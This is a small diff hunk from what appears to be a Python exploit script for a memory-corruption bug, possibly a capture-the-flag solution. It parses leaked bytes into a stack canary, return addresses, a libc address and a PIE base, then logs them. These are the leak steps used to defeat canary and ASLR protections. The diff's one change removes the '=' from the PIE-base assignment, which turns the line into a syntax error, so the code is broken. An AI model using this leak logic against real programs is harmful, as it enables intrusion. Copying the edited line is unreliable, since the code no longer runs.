@@ -83,7 +83,7 @@ ret_plus_one = u64(recv[16:23].strip().ljust(8, b"\x00"))
 ret_plus_two = u64(recv[24:31].strip().ljust(8, b"\x00"))
 ret_plus_three = u64(recv[32:40].strip().ljust(8, b"\x00"))
 libc_leak = u64(recv[40:48].strip().ljust(8, b"\x00"))
-pie_base = ret_leak - 0x1521
+pie_base  ret_leak - 0x1521
 
 # Write leaks to terminal
 log.info("canary leak: %s" % hex(canary))
